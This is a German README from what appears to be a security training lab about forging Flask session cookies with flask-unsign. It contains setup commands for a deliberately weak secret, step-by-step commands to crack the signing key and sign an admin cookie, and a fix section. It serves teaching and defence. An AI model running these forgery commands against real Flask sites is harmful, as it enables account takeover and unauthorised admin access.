# Ordner 13 — Session-ID-Forgery mit flask-unsign

Flask legt die Session in einem **signierten** Cookie ab (Inhalt ist lesbar, nur
gegen Änderung per `SECRET_KEY` signiert). Ist der Key schwach oder geleakt, fälscht
ein Angreifer beliebige Sessions — z. B. `{"user":"admin"}`.

## Szenario starten (schwaches Secret)
```powershell
pip install -r requirements.txt flask-unsign
python seed.py
$env:VULN_WEAK_SECRET = "1"     # Key = "cowboy"
python app.py
```

## Angriff mit flask-unsign
```bash
# 1. Eigenen (harmlosen) Cookie aus dem Browser kopieren, dann Secret knacken:
flask-unsign --unsign --cookie "<session-cookie-wert>" --wordlist wordlist.txt
#   -> findet: 'cowboy'

# 2. Cookie mit gewünschtem Inhalt fälschen und mit dem Key signieren:
flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'cowboy'

# 3. Den erzeugten Wert im Browser als 'session'-Cookie setzen -> eingeloggt als admin.
```

## Der Fix
Starten **ohne** `VULN_WEAK_SECRET` benutzt ein **starkes** Secret
(`os.urandom(32)` bzw. `SECRET_KEY` aus der Umgebung). Dann:
```bash
flask-unsign --unsign --cookie "..." --wordlist wordlist.txt
#   -> kein Treffer; der Key ist nicht ratbar.
```
Regeln:
- `SECRET_KEY` **lang & zufällig**, aus der Umgebung/Secret-Manager, **nie im Code**
  (Bezug: Ordner 07 detect-secrets, Ordner 14 LFI, Ordner 99 Secret-Scanner).
- Bei Verdacht auf Leak: Key **rotieren** (invalidiert alle Sessions).
- Sensible Daten nicht in die Client-Session legen (sie ist lesbar, nur signiert).

## Verbindung
Der per **XSS** (Ordner 10) geklaute Cookie und die **hier** gefälschte Session führen
beide zu Session-Hijacking — einmal durch Diebstahl, einmal durch Fälschung.
